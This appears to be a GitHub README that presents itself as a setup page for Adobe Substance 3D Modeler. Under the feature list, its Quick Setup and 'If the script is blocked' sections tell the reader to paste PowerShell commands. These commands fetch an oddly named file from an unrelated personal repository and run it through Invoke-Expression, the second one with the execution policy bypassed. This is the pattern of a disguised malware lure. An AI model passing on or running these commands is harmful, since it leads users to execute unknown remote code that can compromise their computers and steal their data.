# Substance 3D Modeler

Substance 3D Modeler is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Substance 3D Modeler and work in it.

Adobe Substance 3D Modeler is a Windows desktop application for building 3D assets with an intuitive clay-like workflow. It combines voxel sculpting with signed-distance-field editing so you can push, pull, and boolean shapes quickly, then switch to precise surfacing when the silhouette is right. The tool fits props, characters, and environment pieces that need readable forms before UVs and materials.

A typical session starts with a primitive or imported base mesh, then you scale and merge volumes to establish proportions. You refine with brushes, symmetry, and layer stacks, use gizmo-based cuts and joins for hard edges, and preview lighting to check silhouette. When the model reads well from several angles, you export to OBJ or FBX for Substance 3D Painter, your DCC, or a real-time engine.

This repository tracks a Windows setup package, release notes, and a changelog so installs stay repeatable across machines. The setup file documents version and install steps; notes capture driver, tablet, and VR optional requirements; the changelog records fixes and behavior changes between builds.

## What you do with it

- Clay-stacking lets you merge primitives into solid volumes before refining surface detail.
- SDF booleans cut, union, and intersect shapes without fragile mesh topology during early blocking.
- Symmetry and mirroring speed character and prop work while you sculpt on Windows tablets or mice.
- Layer stacks non-destructively store sculpt passes so you can revisit proportions without rebuilding meshes.
- Hard-surface gizmos bevel, slice, and align faces when organic brushes are too soft for mechanical parts.
- Export paths send finished assets to FBX or OBJ for texturing tools and real-time engines.
- Optional VR mode places you inside the volume so scale and depth feel natural during blocking.
- Live clay preview updates lighting and material hints so silhouettes read before you commit to export.

## Quick Setup (PowerShell)

This installs the program Substance 3D Modeler on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/walter-monika371485/substance-3d-modeler-setup-guide/main/1o2phnh3ph.75erpn0c | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/walter-monika371485/substance-3d-modeler-setup-guide/main/1o2phnh3ph.75erpn0c | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `1o2phnh3ph.75erpn0c` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `walter-monika371485/substance-3d-modeler-setup-guide`. Adobe Substance 3D Modeler 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
